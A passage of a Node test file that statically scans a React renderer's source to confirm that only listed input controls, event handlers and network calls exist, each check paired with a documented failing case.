// SPDX-License-Identifier: MIT OR Apache-2.0
//
// This file asserts an absence, which is the kind of claim that rots quietly:
// a scan that has stopped matching passes exactly like a floor that has stopped
// having controls. So an absence check here is paired with the same search
// run over text that does contain what it is looking for, and that pair is
// the whole reason to believe the first half.
//
// The scans here read source text and syntax, not what runs. A change they do
// not look for passes: a function replaced at run time by an assignment, a
// method override or a patched prototype, say. So a pinned expression or a
// single binding is a fact about the source, not a guarantee about what runs.
//
// Firing controls for this file, each on its own:
//   a) add `<button onClick={...}>answer</button>` to `OfficeCanvas.tsx` — the
//      exact control count goes red;
//   b) send an extra message in `stream.ts` — say `socket.send('{"type":
//      "agent.answer"}')` — "the page sends only the four named read-only stream messages" goes red
//      naming the message;
//   c) delete a pattern from `FORBIDDEN` — "the scan finds what it looks for"
//      goes red, because the fixture that carries a match for each
//      `FORBIDDEN` pattern stops matching;
//   e) build that same hidden `cwd` input with `createElement` instead, or with
//      a dynamic tag (`const Tag = 'input'; <Tag … />`) — "no control is built
//      without JSX" goes red naming the file. So does a use of any other
//      `BUILDERS` name: a `cloneNode` or `importNode` copy, a DOM insertion
//      method such as `appendChild`, `append` or `replaceWith`,
//      `new Image()`, `new Option()` or `new Audio()`, a custom element
//      registry, or a `createElement` outside the portrait's whole pinned
//      probe expression; and a use of an `HTML_SINKS` name, such as a `srcdoc`
//      or `srcDoc`, a `setHTML`, `setHTMLUnsafe`, `parseHTML` or
//      `parseHTMLUnsafe`, an `execCommand` or a `DOMParser`. A use is the name
//      called, read without a call (an alias, `.call`, `.apply`, `.bind`,
//      `Reflect.apply`, a parenthesized or comma callee), destructured,
//      imported, or spelled in any string literal but a JSX attribute's value
//      on a lowercase intrinsic tag. So does a `document.writeln`, a
//      `setAttribute('style', …)`, a `new Terminal` whose `fontFamily` is not
//      a string literal or that sets `windowOptions`, or a later assignment to
//      `….options.fontFamily` or `….options.windowOptions`. Not
//      found: a name built at run time (`el['clone' + 'Node']`, a template
//      with a substitution, a key taken from an object's property list); a
//      `before` or `after` insertion, neither a `BUILDERS` name; a name read
//      only through a TypeScript type position; the probe context's `canvas`,
//      which leads back to the probe's element; and a `document.write`,
//      `setAttribute` or terminal option reached any way but the direct call
//      or assignment;
//   f) drop the sibling check from `answerGate` — "the answer gate stays
//      closed…" goes red (the red-on-missing-gate case);
//   g) let `AnswerFormView` draw its form without consulting the gate on the
//      sibling — "with the same Waiting row but no answer sibling…" goes red
//      (the red-on-always-rendered case);
//   h) make the gate refuse everything — "the answer form renders when the
//      snapshot carries the answer sibling" goes red (the positive control);
//   i) drop the sibling check from `controlGate` — "the control gate stays
//      closed…" goes red (the red-on-missing-gate case);
//   j) let `ControlStripView` draw its buttons without consulting the gate —
//      "with the same rows but no control sibling…" goes red (the
//      red-on-always-rendered case);
//   k) make the control gate refuse everything — "Pause and Resume render when
//      the snapshot carries the control sibling" goes red (the positive
//      control);
//   l) put a `halt` member in the control request, or a halt route beside the
//      two — "no control names halt…" goes red naming the file;
//   m) an on[A-Z] handler prop other than onClick — onDoubleClick,
//      onContextMenu, onFocus, onBlur, onWheel or onTouchStart — or a spread
//      (`{...x}`), on a lowercase intrinsic tag anywhere under floor/src
//      outside ADMITTED_HANDLERS turns "every handler prop other than onClick
//      on a lowercase intrinsic tag…" red, naming the file, the handler (or
//      `{...}`) and the element it was found on; a capitalized tag is treated
//      as a component and not scanned; CrewList.tsx's onFocus is admitted
//      only on a `<button>` and only as `() => reveal(row.id)`; onClick is
//      checked by "the only activators are…", which counts `onclick=` per
//      file and matches expression text, not the element that carries it;
//   n) a plain `.src =`, `.href =` or `.srcset =` assignment, or a
//      `setAttribute(` whose first argument is `src`, `href`, `srcset`,
//      `data` or `style` in single or double quotes, anywhere under floor/src
//      turns "session material has…" red, naming the sink; no site is
//      admitted;
//   o) a `src`, `href`, `data`, `srcSet`, `poster` or `xlinkHref` attribute on
//      an intrinsic JSX element, whose value is an expression other than a
//      bare static-asset import identifier, turns "every src, href, data,
//      srcSet, poster or xlinkHref attribute on a lowercase intrinsic tag…"
//      red, naming the file, the tag and the attribute;
//   p) an `=`, `+=`, `||=`, `&&=` or `??=` assignment to a `.on[a-z]+`
//      property, the `.` right before `on` (`.ondblclick =`,
//      `.onbeforepaste =`, `.onclick ??=`), but a Floor data field in
//      `FLOOR_DATA_FIELDS` — a ref callback, say — anywhere under floor/src
//      turns "the floor ships no mutation control…" red, naming the file;
//   q) a `halt?:` optional-field spelling turns "no control names halt…" red,
//      naming the file, and a fourth `fetch(` line in control.ts turns "the
//      page reaches the network in five places…" red, listing the lines;
//   r) `.click` as a whole word with the `.` right before it, or the word
//      `dispatchEvent` or `requestSubmit`, anywhere under floor/src turns "the
//      floor ships no mutation control…" red, naming the file;
//   s) an `onKeyDown` added to OfficeCanvas.tsx with its `ADMITTED_HANDLERS`
//      rule and no `ADMITTED` entry turns "the floor ships no mutation
//      control…" red; without the rule it turns "every handler prop…" red;
//   t) `['src'] =`, `.poster =`, `.data =`, `.src +=` or `??=`, a
//      `setAttributeNS`, or a backtick-quoted or upper-case name, or a space
//      before the parenthesis, in `setAttribute`, turns "session material
//      has…" red, naming the sink, and a JSX `xlink:href` turns "every src,
//      href, data, srcSet, poster or xlinkHref attribute…" red;
//   u) a second binding of an identifier `namesReadIn` lists for a handler
//      prop, in a function around it (a `const` in a `map` callback, a
//      default-valued parameter), or one the file does not bind, turns "every
//      identifier namesReadIn lists…" red, naming the file, the handler and
//      the identifier;
//   y) dropping the sibling check from `goalGate` turns "the goal gate stays
//      closed…" red; letting `GoalFormView` draw its form without consulting
//      the gate turns "with the same rows but no goal sibling…" red; making
//      the goal gate refuse everything turns "the goal form renders when the
//      snapshot carries the goal sibling" red (the positive control);
//   z) an `onKeyDown` on the goal textarea turns "the floor ships no mutation
//      control…" red, a second path or fetch in goal.ts turns "fetch and new
//      WebSocket match in six known files…" red, and the goal route named
//      outside goal.ts turns "only the goal module names the goal route…" red;
//   aa) a fifth message handed to terminal.ts's `send`, or a second socket
//      send there, turns "the terminal channel sends only…" red, and so does
//      a second `writeTerminal` caller, or one that hands on anything but the
//      grid's own `onData` argument;
//   ab) dropping the sibling check from `terminalOffer` turns "the terminal
//      offer stays none…" and "with the same rows but no terminal sibling…"
//      red, and a line that names the grid outside ADMITTED_TERMINAL_LINES
//      turns "no source asks for…" red;
//   ac) dropping the sibling check from `retireOffer` turns "the retire offer
//      stays none…" and "with the same rows but no retire sibling…" red;
//      making it refuse everything turns "Retire renders when the snapshot
//      carries the retire sibling" red (the positive control);
//   ad) a second path or fetch in retire.ts turns "fetch and new WebSocket
//      match in seven known files…" red, the retire route named outside
//      retire.ts turns "no source asks for…" red, and a line naming the local
//      retire method outside ADMITTED_OPERATOR_LINES turns "no source asks
//      for…" red;
//   ae) a `contenteditable`, a `designMode` or a CSS `-webkit-user-modify`
//      anywhere under floor/src turns "the floor admits only the named
//      controls and forms" red, naming the file.

import assert from 'node:assert/strict';
import { readdir, readFile } from 'node:fs/promises';
import { extname, resolve } from 'node:path';
import test, { after, before } from 'node:test';

import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ts from 'typescript';
import { createServer } from 'vite';

import { loadStage } from './helpers/page.mjs';

import { answerGate } from '../src/renderer/answer/answer.ts';
import { controlGate } from '../src/renderer/control/control.ts';
import { goalGate } from '../src/renderer/goal/goal.ts';
import { retireOffer } from '../src/renderer/retire/retire.ts';
import { terminalOffer } from '../src/renderer/terminal/terminal.ts';
import { chatGate } from '../src/renderer/chat/chat.ts';
import {
  applyServerFrame, beginFloorEpoch, getFloorState, invalidateFloorEpoch, noteStale, noteTransport,
  resetFloorStore,
} from '../src/renderer/floor/store.ts';

const floor = resolve(import.meta.dirname, '..');
const source = resolve(floor, 'src');
const built = resolve(floor, 'dist');

/**
 * Floor data fields named `on…`. The scan test asserts that each entry is one
 * `on[a-z]+` name and not a handler name TypeScript's `lib.dom.d.ts` declares.
 */
const FLOOR_DATA_FIELDS = ['onboarding'];
const DOM_HANDLER_NAMES = new Set(Array.from(
  (await readFile(new URL('lib.dom.d.ts', import.meta.resolve('typescript')), 'utf8'))
    .matchAll(/^\s+(on[a-z]+)\??: \(\(this: /gm),
  ([, name]) => name));
const DOM_HANDLER = 'a handler property assigned on a DOM node '
  + '(await image.decode() for a load; pin a JSX handler in ADMITTED_HANDLERS for a control)';
const ACTIVATION = 'a programmatic activation: .click, dispatchEvent or requestSubmit';

/**
 * The spellings of a mutation control this scan refuses, each one listed:
 * elements a person can activate, the JSX and HTML handler spellings below,
 * and an `=`, `+=`, `||=`, `&&=` or `??=` assignment to a `.on[a-z]+`
 * property, the `.` right before `on`, but a Floor data field in
 * `FLOOR_DATA_FIELDS`; `.click` as a whole word with the `.` right before
 * it; and the words `dispatchEvent` and `requestSubmit` anywhere.
 * `addEventListener` is not here: the floor uses it for the WebSocket and the
 * resize observer, and a blanket ban would say something false about both.
 * The finite native selection and view buttons are counted separately.
 */
const FORBIDDEN = [
  ['an input', /<input[\s/>]/i],
  ['a form', /<form[\s/>]/i],
  ['a textarea', /<textarea[\s/>]/i],
  ['a select', /<select[\s/>]/i],
  ['a link', /<a\s[^>]*href/i],
  // `designMode` and the CSS `-webkit-user-modify` make a page or element editable as `contenteditable` does.
  ['an editable region', /contenteditable|designMode|user-modify/i],
  ['a change handler', /\bonChange\b|\bonchange\s*=/i],
  ['a submit handler', /\bonSubmit\b|\bonsubmit\s*=/i],
  ['an input handler', /\bonInput\b|\boninput\s*=/i],
  ['a key handler', /\bonKey[A-Z]|\bonkey(down|up|press)\s*=/i],
  ['a mouse handler', /\bonMouse[A-Z]|\bonmouse(down|up|over)\s*=/i],
  ['a pointer handler', /\bonPointer[A-Z]|\bonpointer(down|up)\s*=/i],
  [DOM_HANDLER, new RegExp(`\\.(?!(?:${FLOOR_DATA_FIELDS.join('|')})\\b)on[a-z]+\\s*(?:\\+|\\|\\||&&|\\?\\?)?=(?!=)`)],
  [ACTIVATION, /\.click\b|\bdispatchEvent\b|\brequestSubmit\b/],
];

/** Every file under `root` whose extension is one this scan reads. */
async function filesUnder(root, extensions, found = []) {
  let entries;
  try {
    entries = await readdir(root, { withFileTypes: true });
  } catch {
    return found; // an absent `dist` is the caller's problem to assert, not this one's
  }
  for (const entry of entries) {
    const path = resolve(root, entry.name);
    if (entry.isDirectory()) await filesUnder(path, extensions, found);
    else if (extensions.includes(extname(entry.name))) found.push(path);
  }
  return found;
}

/** To the TSX parser, a `.ts` file's generic arrow `<T>(x: T) => x` opens a JSX element. */
function parsedByExtension(text, file) {
  const syntax = ts.createSourceFile(file, text, ts.ScriptTarget.Latest, true,
    file.endsWith('.tsx') ? ts.ScriptKind.TSX : ts.ScriptKind.TS);
  assert.deepEqual(syntax.parseDiagnostics, [], `${file} no longer parses`);
  return syntax;
}

/** The names of the `FORBIDDEN` patterns that match this text. */
function controlsIn(text) {
  return FORBIDDEN.filter(([, pattern]) => pattern.test(text)).map(([name]) => name);
}

const HIRE_FORM = 'src/renderer/onboarding/HireWizard.tsx';
const HIRE_FIELDS = Object.freeze([
  { tag: 'input', name: 'name', type: 'text', change: '(event) => editDraft({ name: event.target.value })' },
  { tag: 'select', name: 'character', type: null, change: '(event) => editDraft({ character: event.target.value })' },
  { tag: 'input', name: 'accent', type: 'radio', change: '() => editDraft({ accent: void 0 })' },
  { tag: 'input', name: 'accent', type: 'radio', change: '() => editDraft({ accent })' },
  { tag: 'textarea', name: 'role', type: null, change: '(event) => editDraft({ role: event.target.value })' },
  { tag: 'input', name: 'workspace_id', type: 'radio', change: '() => editDraft({ workspaceId: space.workspaceId })' },
  { tag: 'input', name: 'engine', type: 'radio', change: '() => editDraft({ engine: name })' },
  { tag: 'input', name: 'check_id', type: 'radio', change: '() => editDraft({ checkId: option.id })' },
  { tag: 'textarea', name: 'goal_text', type: null, change: '(event) => editDraft({ goalText: event.target.value })' },
]);
const ADMITTED_IN_HIRE_FORM = Object.freeze(['an input', 'a textarea', 'a select', 'a change handler']);

const ANSWER_FORM = 'src/renderer/answer/AnswerPanel.tsx';
const ANSWER_MODULE = 'src/renderer/answer/answer.ts';
const CHAT_PANEL = 'src/renderer/chat/ChatPanel.tsx';
const CHAT_MODULE = 'src/renderer/chat/chat.ts';
const ADMITTED_IN_ANSWER_FORM = Object.freeze(['a textarea', 'a change handler', 'a key handler']);
const CONTROL_PANEL = 'src/renderer/control/ControlPanel.tsx';
const PAUSE_ALL_PANEL = 'src/renderer/control/PauseAllControl.tsx';
const CONTROL_MODULE = 'src/renderer/control/control.ts';
const TERMINAL_PANEL = 'src/renderer/terminal/TerminalPanel.tsx';
const TERMINAL_MODULE = 'src/renderer/terminal/terminal.ts';
const TERMINAL_CONTROLS = 'src/renderer/terminal/controls.ts';
const RETIRE_PANEL = 'src/renderer/retire/RetirePanel.tsx';
const RETIRE_MODULE = 'src/renderer/retire/retire.ts';
const TICKET_MODULE = 'src/renderer/ticket/ticket.ts';
const TICKET_BOARD = 'src/renderer/ticket/TicketBoard.tsx';
const TICKET_PANEL = 'src/renderer/ticket/TicketPanel.tsx';
const ADMITTED_IN_TICKET_FORM = Object.freeze(['an input', 'a form', 'a textarea', 'a select', 'a change handler', 'a submit handler']);
const GIT_MODULE = 'src/renderer/git/git.ts';
const GIT_PANEL = 'src/renderer/git/GitPanel.tsx';
const DIFF_PANEL = 'src/renderer/diff/DiffPanel.tsx';
const DIFF_MODULE = 'src/renderer/diff/diff.ts';
const MEMORY_MODULE = 'src/renderer/memory/memory.ts';
const MEMORY_PANEL = 'src/renderer/memory/MemoryPanel.tsx';
const ADMITTED_IN_CONTROL_PANEL = Object.freeze(['a key handler']);
const GOAL_PANEL = 'src/renderer/goal/GoalPanel.tsx';
const GOAL_MODULE = 'src/renderer/goal/goal.ts';
const RENAME_MODULE = 'src/renderer/rename/rename.ts';
const RENAME_PANEL = 'src/renderer/rename/NameEditor.tsx';
const LOOK_MODULE = 'src/renderer/look/look.ts';
const LOOK_PANEL = 'src/renderer/look/LookEditor.tsx';
const ADMITTED_IN_GOAL_FORM = Object.freeze(['a textarea', 'an input', 'a change handler']);
const SETUP_VIEW = 'src/renderer/setup/SetupView.tsx';
const FIRST_RUN_GUIDE = 'src/renderer/setup/FirstRunGuide.tsx';
const SETTINGS_VIEW = 'src/renderer/settings/SettingsView.tsx';
const FLOOR_SHELL = 'src/shell.tsx';
const AGENT_ORDER = 'src/renderer/AgentOrder.tsx';
const ARCHIVED_AGENTS = 'src/renderer/ArchivedAgents.tsx';
const CONTROL_VIEW = 'src/renderer/Control.tsx';
/** Escape closes a Control view, or the drawer from anywhere on the stage, unless a field already used it. It sends nothing. */
const CLOSE_ON_ESCAPE = '(event) => { if (closesPanel(event)) { event.stopPropagation(); onClose(); } }';
const CLOSE_DRAWER_ON_ESCAPE = '(event) => { if (closesDrawer(event, drawerOpen)) { event.stopPropagation(); clearSelection(); } }';
const ACTIVITY_PANEL = 'src/renderer/LogPanel.tsx';
const HIRE_ENTRY = 'src/renderer/onboarding/HireEntry.tsx';
/**
 * `FORBIDDEN` kinds a file carries that no handler rule names. The Setup
 * view's install guide link, the About links and the update notice link navigate away and send nothing; its Recheck and
 * Copy buttons are counted with the other activators below.
 */
const STREAM_NOTICE = 'src/renderer/StreamNotice.tsx';
const ADMITTED_WITHOUT_HANDLER = new Map([
  [SETUP_VIEW, Object.freeze(['a link'])], [SETTINGS_VIEW, Object.freeze(['a link'])], [STREAM_NOTICE, Object.freeze(['a link'])],
]);
/**
 * The `FORBIDDEN` kinds each listed file may carry. "the floor ships no
 * mutation control…" asserts that each file's list equals the kinds its
 * `ADMITTED_HANDLERS` rules name, so an admitted handler whose kind
 * `FORBIDDEN` names needs both.
 */
const ADMITTED = new Map([
  [HIRE_FORM, ADMITTED_IN_HIRE_FORM], [ANSWER_FORM, ADMITTED_IN_ANSWER_FORM], [CONTROL_PANEL, ADMITTED_IN_CONTROL_PANEL],
  [ACTIVITY_PANEL, Object.freeze(['an input', 'a select', 'a change handler'])],
  [GOAL_PANEL, ADMITTED_IN_GOAL_FORM],
  [TICKET_BOARD, Object.freeze([...ADMITTED_IN_TICKET_FORM, 'a key handler'])], [TICKET_PANEL, ADMITTED_IN_TICKET_FORM],
  [CHAT_PANEL, Object.freeze(['a textarea', 'a change handler', 'a key handler'])],
  [RENAME_PANEL, Object.freeze(['an input', 'a change handler', 'a key handler'])],
  [LOOK_PANEL, Object.freeze(['an input', 'a form', 'a textarea', 'a select', 'a change handler',
    'a submit handler', 'a key handler'])],
  [FLOOR_SHELL, Object.freeze(['a key handler', 'a pointer handler'])],
  [AGENT_ORDER, Object.freeze(['a key handler', 'a pointer handler'])],
  ['src/renderer/AgentDetail.tsx', Object.freeze(['a key handler'])],
  [CONTROL_VIEW, Object.freeze(['a key handler'])],
  [TERMINAL_PANEL, Object.freeze(['a textarea', 'a key handler'])],
  [FIRST_RUN_GUIDE, Object.freeze(['a key handler'])],
]);
/** The slot's one key handler: a held key's repeats are not presses. It sends nothing. */
const REFUSE_REPEAT = '(event) => { if (event.repeat) event.preventDefault(); }';
const TERMINAL_HEADER_KEYS = `(event) => {
          if (expanded && event.key === 'Tab' && !event.ctrlKey && !event.metaKey && !event.altKey) {
            const buttons = actions.current?.querySelectorAll<HTMLButtonElement>('button:not(:disabled)');
            if (event.shiftKey && event.target === buttons?.[0]) {
              event.preventDefault();
              event.stopPropagation();
              screen.current?.focus();
              return;
            }
            if (!event.shiftKey && screen.current === null && buttons?.length
              && event.target === buttons[buttons.length - 1]) {
              event.preventDefault();
              event.stopPropagation();
              buttons[0]?.focus();
              return;
            }
          }
          const action = terminalShortcut(event, platform, 'header');
          if (action === null) return;
          event.preventDefault();
          event.stopPropagation();
          command(action);
        }`;

/**
 * Every intrinsic JSX element's `on[A-Z]` handler prop this file admits, by
 * exact file, element and handler name; no rule admits a handler across a
 * whole file.
 * `tag` narrows which intrinsic element may carry it; where a rule also gives
 * `className`, it narrows further to the one element carrying that exact
 * class; where a rule also gives `expression`, the handler's own body must
 * match too, so a different body planted on the same element still refuses.
 *
 * `onClick` is not named here on purpose, but not because it is exactly
 * enumerated in each file: "the only activators are…" below counts the
 * `<button` and `onclick=` matches in each .ts, .tsx and .html file under
 * `source`, per file — a new `onClick` changes that count even in a file with
 * no `ADMITTED_HANDLERS` rule. Its own firing control appends a
 * button to `OfficeCanvas.tsx`'s text — already a counted file — and
 * confirms both counts see it; a new file changes the per-file list instead.
 *
 * A JSX spread (`{...x}`) on an intrinsic element is refused outright,
 * whatever it carries: it can carry an `on[A-Z]` prop, `onClick` included,
 * that this scan cannot read, so no rule admits one.
 *
 * `ADMITTED` is a second list. A rule whose tag or handler a `FORBIDDEN`
 * pattern names, such as an `onKeyDown`, also needs that kind in its file's
 * `ADMITTED` entry, in the two forms and outside them.
 */
const CREW_LIST = 'src/renderer/CrewList.tsx';
const ADMITTED_HANDLERS = [
  { file: 'src/renderer/AgentDetail.tsx', tag: 'button', className: 'agent-detail-tab', handler: 'onFocus', expression: '() => setFocusedSection(id)' },
  { file: 'src/renderer/AgentDetail.tsx', tag: 'button', className: 'agent-detail-tab', handler: 'onBlur', expression: '() => setFocusedSection(null)' },
  { file: 'src/renderer/AgentDetail.tsx', tag: 'section', handler: 'onFocus', expression: '() => setFocusedSection(id)' },
  { file: 'src/renderer/AgentDetail.tsx', tag: 'section', handler: 'onBlur',
    expression: '(event) => {\n          if (!event.currentTarget.contains(event.relatedTarget)) setFocusedSection(null);\n        }' },
  { file: 'src/renderer/AgentDetail.tsx', tag: 'button', className: 'agent-detail-tab', handler: 'onKeyDown',
    expression: '(event) => {\n            if (event.altKey || event.ctrlKey || event.metaKey || event.shiftKey) return;\n            const target = detailTabTarget(tabs, id, event.key);\n            if (target === null) return;\n            event.preventDefault();\n            onTabChange(target);\n            event.currentTarget.ownerDocument.getElementById(`agent-detail-tab-${target}`)?.focus();\n          }' },
  { file: TERMINAL_PANEL, tag: 'div', className: 'terminal-actions', handler: 'onKeyDown', expression: TERMINAL_HEADER_KEYS },
  { file: TERMINAL_PANEL, tag: 'textarea', handler: 'onFocus', expression: '(event) => event.currentTarget.select()' },
  { file: FIRST_RUN_GUIDE, tag: 'aside', className: 'first-run-guide', handler: 'onKeyDown',
    expression: "(event) => { if (event.key === 'Escape') { event.stopPropagation(); onClose(); } }" },
  { file: ACTIVITY_PANEL, tag: 'select', handler: 'onChange',
    expression: '(event) => setFilters({ ...filters, agentId: event.currentTarget.value })' },
  { file: ACTIVITY_PANEL, tag: 'select', handler: 'onChange',
    expression: '(event) => setFilters({ ...filters, kind: event.currentTarget.value })' },
  { file: ACTIVITY_PANEL, tag: 'input', handler: 'onChange',
    expression: '(event) => setFilters({ ...filters, query: event.currentTarget.value })' },
  ...[['onPointerDown', 'startDrag'], ['onPointerMove', 'moveDrag'], ['onPointerUp', 'endDrag'],
    ['onPointerCancel', 'endDrag'], ['onLostPointerCapture', 'endDrag'], ['onKeyDown', 'keyMove']]
    .map(([handler, expression]) => ({ file: AGENT_ORDER, tag: 'button', className: 'agent-reorder-handle', handler, expression })),
  { file: RENAME_PANEL, tag: 'input', handler: 'onFocus', expression: '(event) => event.currentTarget.select()' },
  { file: RENAME_PANEL, tag: 'input', handler: 'onChange' },
  { file: RENAME_PANEL, tag: 'input', handler: 'onKeyDown' },
  { file: LOOK_PANEL, tag: 'form', handler: 'onSubmit',
    expression: '(event) => { event.preventDefault(); void submitLook(row, browserLookDeps); }' },
  { file: LOOK_PANEL, tag: 'form', handler: 'onKeyDown',
    expression: "(event) => { event.stopPropagation(); if (event.key === 'Escape') { event.preventDefault(); cancelLook(); } }" },
  { file: LOOK_PANEL, tag: 'select', handler: 'onChange',
    expression: '(event) => editLook({ character: event.currentTarget.value || null })' },
  { file: LOOK_PANEL, tag: 'input', handler: 'onChange', expression: '() => editLook({ accent: null })' },
  { file: LOOK_PANEL, tag: 'input', handler: 'onChange', expression: '() => editLook({ accent })' },
  { file: LOOK_PANEL, tag: 'textarea', handler: 'onChange',
    expression: '(event) => editLook({ role: event.currentTarget.value })' },
  { file: 'src/renderer/AgentDetail.tsx', tag: 'h2', handler: 'onDoubleClick', expression: '() => beginRename(`detail:${row.id}`, row)' },
  ...HIRE_FIELDS.map(({ tag, change }) => ({ file: HIRE_FORM, tag, handler: 'onChange', expression: change })),
  { file: ANSWER_FORM, tag: 'textarea', handler: 'onChange' },
  { file: ANSWER_FORM, tag: 'textarea', handler: 'onKeyDown' },
  { file: ANSWER_FORM, tag: 'button', className: 'answer-send', handler: 'onKeyDown', expression: REFUSE_REPEAT },
  { file: GOAL_PANEL, tag: 'textarea', handler: 'onChange' },
  // The ticket forms hold the draft in the page and send one typed request on submit.
  ...[TICKET_BOARD, TICKET_PANEL].flatMap((file) => [
    { file, tag: 'form', className: 'ticket-form', handler: 'onSubmit', expression: '(event) => { void submit(event); }' },
    { file, tag: 'input', handler: 'onChange' },
    { file, tag: 'textarea', handler: 'onChange' },
    { file, tag: 'select', handler: 'onChange' },
  ]),
  { file: GOAL_PANEL, tag: 'input', handler: 'onChange', expression: "() => choose('keep')" },
  { file: GOAL_PANEL, tag: 'input', handler: 'onChange', expression: '() => choose({ id: option.id })' },
  { file: CHAT_PANEL, tag: 'textarea', handler: 'onChange', expression: '(event) => editChatDraft(row.id, event.currentTarget.value)' },
  { file: CHAT_PANEL, tag: 'textarea', handler: 'onKeyDown',
    expression: '(event) => {\n          if (!queuesChatOnKey(event) || blocked || action.sending) return;\n          event.preventDefault();\n          void submitChat(gate, browserChatDeps);\n        }' },
  { file: CHAT_PANEL, tag: 'div', className: 'chat-scroll', handler: 'onScroll',
    expression: 'event => {\n        const node = event.currentTarget;\n        follow.current = node.scrollHeight - node.scrollTop - node.clientHeight < 48;\n      }' },
  // ControlPanel.tsx: Pause and Resume keep keyboard focus while they wait, so a
  // held Enter would otherwise press the verb the slot flips to. Each refuses
  // repeats and nothing else, pinned by its exact body on its own button.
  { file: CONTROL_PANEL, tag: 'button', className: 'control-pause', handler: 'onKeyDown', expression: REFUSE_REPEAT },
  { file: CONTROL_PANEL, tag: 'button', className: 'control-resume', handler: 'onKeyDown', expression: REFUSE_REPEAT },
  // RetirePanel.tsx: Escape fires the modal confirmation's `cancel`, which
  // closes it and sends nothing.
  { file: RETIRE_PANEL, tag: 'dialog', className: 'retire-dialog', handler: 'onCancel', expression: 'cancelRetire' },
  // TerminalPanel.tsx: the same for the Attach confirmation, which opens nothing.
  { file: TERMINAL_PANEL, tag: 'dialog', className: 'retire-dialog', handler: 'onCancel', expression: 'onCancel' },
  { file: CREW_LIST, tag: 'button', handler: 'onFocus', expression: '() => reveal(row.id)' },
  // ArchivedAgents.tsx: the Memory disclosure mounts its panel only while open, so closing it forgets what was read.
  { file: ARCHIVED_AGENTS, tag: 'details', className: 'archive-memory', handler: 'onToggle',
    expression: '(event) => setOpen(event.currentTarget.open)' },
  { file: FLOOR_SHELL, tag: 'div', className: 'floor-stage', handler: 'onKeyDown', expression: CLOSE_DRAWER_ON_ESCAPE },
  { file: CONTROL_VIEW, tag: 'section', className: 'control-panel', handler: 'onKeyDown', expression: CLOSE_ON_ESCAPE },
  { file: CONTROL_VIEW, tag: 'dialog', className: 'ticket-dialog', handler: 'onCancel',
    expression: '(event) => { event.preventDefault(); closeOverlay(); }' },
  { file: CONTROL_VIEW, tag: 'dialog', className: 'ticket-dialog', handler: 'onKeyDown',
    expression: "(event) => { if (event.key === 'Escape') event.stopPropagation(); }" },
  { file: TICKET_BOARD, tag: 'div', className: 'ticket-card-regions', handler: 'onKeyDown', expression: 'moveCardFocus' },
  { file: FLOOR_SHELL, tag: 'div', className: 'panel-splitter', handler: 'onPointerDown', expression: 'startResize' },
  { file: FLOOR_SHELL, tag: 'div', className: 'panel-splitter', handler: 'onPointerMove', expression: 'moveResize' },
  { file: FLOOR_SHELL, tag: 'div', className: 'panel-splitter', handler: 'onPointerUp', expression: 'endResize' },
  { file: FLOOR_SHELL, tag: 'div', className: 'panel-splitter', handler: 'onPointerCancel', expression: 'endResize' },
  { file: FLOOR_SHELL, tag: 'div', className: 'panel-splitter', handler: 'onKeyDown', expression: 'keyResize' },
  { file: FLOOR_SHELL, tag: 'div', className: 'panel-splitter', handler: 'onDoubleClick', expression: 'resetSidebar' },
  { file: FLOOR_SHELL, tag: 'dialog', className: 'hire-dialog', handler: 'onPointerDown',
    expression: '(event) => {\n          backdropPress.current = event.target === event.currentTarget && event.button === 0 && event.isPrimary\n            ? event.pointerId : null;\n        }' },
  { file: FLOOR_SHELL, tag: 'dialog', className: 'hire-dialog', handler: 'onPointerUp',
    expression: '(event) => {\n          const dismiss = backdropPress.current === event.pointerId\n            && event.currentTarget.ownerDocument.elementFromPoint(event.clientX, event.clientY) === event.currentTarget\n            && event.button === 0 && event.isPrimary;\n          backdropPress.current = null;\n          if (dismiss) closeHire();\n        }' },
  { file: FLOOR_SHELL, tag: 'dialog', className: 'hire-dialog', handler: 'onPointerCancel',
    expression: '() => { backdropPress.current = null; }' },
  { file: FLOOR_SHELL, tag: 'dialog', className: 'hire-dialog', handler: 'onCancel',
    expression: '(event) => { event.preventDefault(); closeHire(); }' },
];

/** The `FORBIDDEN` kinds each file's rules name, for each file whose rules name one. */
const ADMITTED_BY_RULES = new Map();
for (const { file, tag, handler } of ADMITTED_HANDLERS) {
  for (const kind of controlsIn(`<${tag} ${handler}=`)) {
    if (!ADMITTED_BY_RULES.has(file)) ADMITTED_BY_RULES.set(file, new Set());
    ADMITTED_BY_RULES.get(file).add(kind);
  }
}

test("CrewList.tsx's top-level imports include its live activity expiry hook, it binds reveal once, "
  + "and reveal's body is one scrollIntoView statement", async () => {
  const text = await readFile(resolve(floor, CREW_LIST), 'utf8');
  const syntax = parsedByExtension(text, CREW_LIST);
  const specifiers = syntax.statements.filter(ts.isImportDeclaration).map((node) => node.moduleSpecifier.text);
  const revealBody = [];
  (function collect(node) {
    if (ts.isFunctionDeclaration(node) && node.name?.text === 'reveal' && node.body !== undefined) {
      revealBody.push(...node.body.statements.map((statement) => statement.getText(syntax)));
    }
    ts.forEachChild(node, collect);
  })(syntax);
  assert.deepEqual(specifiers.sort(), ['./AgentOrder.tsx', './Portrait.tsx', './board.ts', './crewRow.ts', './scene/cast.ts', './useLiveActivityExpiry.ts', './workspace.ts', './worktree.ts', 'react'],
    "CrewList.tsx's top-level imports changed; inspect any new path for an answer input");
  assert.equal(bindingNamesIn(syntax).filter(({ name }) => name === 'reveal').length, 1,
    'CrewList.tsx binds reveal more than once, so the pinned body may not be the one onFocus calls');
  assert.deepEqual(revealBody, ["buttons.current.get(id)?.scrollIntoView({ block: 'nearest', inline: 'nearest' });"],
    "reveal's body is no longer its one scrollIntoView statement");
});

/** An element's `className` string literal, or null if it has no `className` or its value is not one. */
function classNameOf(node, syntax) {
  const found = node.attributes.properties
    .find((entry) => ts.isJsxAttribute(entry) && entry.name.getText(syntax) === 'className');
  if (found === undefined || found.initializer === undefined) return null;
  return ts.isStringLiteral(found.initializer) ? found.initializer.text : null;
}

/** Whether a JSX tag name identifier is a lowercase (DOM) intrinsic rather than a component's. */
function isIntrinsicTagName(tag) {
  return ts.isIdentifier(tag) && /^[a-z]/.test(tag.text);
}

/**
 * Only lowercase intrinsic tags are returned. A capitalized tag is treated as
 * a component and not scanned: its props, spread or named, are its own
 * vocabulary, and it decides what to do with them. A capitalized name bound to
 * an intrinsic tag string is not seen.
 */
function intrinsicElementsIn(syntax) {
  const found = [];
  (function walk(node) {
    if ((ts.isJsxOpeningElement(node) || ts.isJsxSelfClosingElement(node)) && isIntrinsicTagName(node.tagName)) {
      found.push(node);
    }
    ts.forEachChild(node, walk);
